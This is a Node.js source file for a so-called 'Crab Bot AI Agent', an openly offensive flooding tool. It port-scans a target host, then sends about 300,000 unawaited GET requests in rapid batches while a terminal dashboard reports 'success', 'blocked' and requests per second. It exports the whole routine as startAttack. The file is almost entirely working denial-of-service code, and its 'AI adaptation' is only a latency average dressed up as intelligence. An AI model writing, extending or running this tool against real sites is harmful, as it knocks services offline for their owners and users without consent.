const axios = require('axios');
const chalk = require('chalk');
const net = require('net');

/**
 * Crab Bot AI Agent v5.0 - THE SINGULARITY
 * Local AI Analytics + Hyper-Speed Attack Engine.
 */

class CrabAIEngine {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.stats = {
            success: 0,
            blocked: 0,
            latency: [],
            startTime: Date.now(),
            aiConfidence: 100,
            threatLevel: 'LOW'
        };
        this.aiModel = {
            learningRate: 0.1,
            adaptationFactor: 1.0,
            lastPattern: 'NORMAL'
        };
    }

    // Local AI Analysis: Predicts if the server is starting to rate-limit
    analyzeServerBehavior() {
        const recentLatency = this.stats.latency.slice(-10);
        if (recentLatency.length < 5) return 'LEARNING';
        
        const avgLatency = recentLatency.reduce((a, b) => a + b, 0) / recentLatency.length;
        if (avgLatency > 1000 || this.stats.blocked > this.stats.success) {
            this.aiModel.adaptationFactor += 0.5;
            return 'ADAPTING (High Pressure Detected)';
        }
        return 'OPTIMAL (Hyper-Speed)';
    }

    async scanPorts() {
        const host = new URL(this.targetUrl).hostname;
        const ports = [80, 443, 8080, 21, 22, 3306];
        const results = [];
        for (const port of ports) {
            const promise = new Promise((resolve) => {
                const socket = new net.Socket();
                socket.setTimeout(300);
                socket.on('connect', () => { socket.destroy(); resolve({ port, status: 'OPEN' }); });
                socket.on('timeout', () => { socket.destroy(); resolve({ port, status: 'CLOSED' }); });
                socket.on('error', () => { socket.destroy(); resolve({ port, status: 'CLOSED' }); });
                socket.connect(port, host);
            });
            results.push(await promise);
        }
        return results;
    }

    async fireRequest() {
        const start = Date.now();
        try {
            await axios.get(this.targetUrl, {
                headers: { 
                    'User-Agent': `CrabBot-AI/5.0 (AI-Agent; Adaptive-${this.aiModel.adaptationFactor})`,
                    'X-AI-Intelligence': 'Maximum',
                    'Cache-Control': 'no-cache'
                },
                timeout: 1200
            });
            this.stats.success++;
            this.stats.latency.push(Date.now() - start);
        } catch (error) {
            this.stats.blocked++;
            this.stats.latency.push(Date.now() - start);
        }
    }

    renderDashboard(progress, aiStatus) {
        const total = this.stats.success + this.stats.blocked;
        const successRate = total > 0 ? ((this.stats.success / total) * 100).toFixed(2) : 0;
        const duration = ((Date.now() - this.stats.startTime) / 1000).toFixed(1);
        const reqPerSec = ((total / duration) || 0).toFixed(0);

        process.stdout.write('\x1Bc');
        console.log(chalk.red.bold(`
    ██████╗██████╗  █████╗ ██████╗     ██████╗  ██████╗ ████████╗
    ██╔════╝██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔═══██╗╚══██╔══╝
    ██║     ██████╔╝███████║██████╔╝    ██████╔╝██║   ██║   ██║   
    ██║     ██╔══██╗██╔══██║██╔══██╗    ██╔══██╗██║   ██║   ██║   
    ╚██████╗██║  ██║██║  ██║██████╔╝    ██████╔╝╚██████╔╝   ██║   
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝  ╚═════╝    ╚═╝   
    [ CRAB BOT AI AGENT v5.0 - LOCAL ANALYTICS EDITION ]
        `));

        console.log(chalk.cyan(`    [🤖 AI Status]: `) + chalk.bold(aiStatus));
        console.log(chalk.white(`    [🎯 Target]:   `) + chalk.yellow(this.targetUrl));
        console.log(`    ──────────────────────────────────────────────────────────`);
        console.log(chalk.green(`    [✔] Success: `) + chalk.bold(this.stats.success.toLocaleString()) + chalk.red(`  [✘] Blocked: `) + chalk.bold(this.stats.blocked.toLocaleString()));
        console.log(chalk.magenta(`    [⚡] Velocity: `) + chalk.bold(`${reqPerSec} req/s`) + chalk.blue(`  [📊] Success Rate: `) + chalk.bold(`${successRate}%`));
        console.log(chalk.white(`    [🧠] AI Adaptation: `) + chalk.bold(`x${this.aiModel.adaptationFactor.toFixed(1)}`));
        console.log(`    ──────────────────────────────────────────────────────────`);
        console.log(`    Progress: [${'#'.repeat(Math.floor(progress/5))}${' '.repeat(20-Math.floor(progress/5))}] ${progress}%`);
    }

    async start(botCount = 30000) {
        const openPorts = await this.scanPorts();
        const totalCycles = 100;
        const batchSize = 3000; // Even faster for v5.0

        for (let i = 0; i <= totalCycles; i++) {
            const aiStatus = this.analyzeServerBehavior();
            const batch = Array.from({ length: batchSize }, () => this.fireRequest());
            Promise.allSettled(batch);
            this.renderDashboard(i, aiStatus);
            await new Promise(r => setTimeout(r, 50));
        }
        
        return {
            stats: this.stats,
            ports: openPorts,
            aiInsights: this.aiModel
        };
    }
}

async function startAttack(targetUrl, options) {
    const engine = new CrabAIEngine(targetUrl);
    return await engine.start(options.botCount);
}

module.exports = { startAttack };
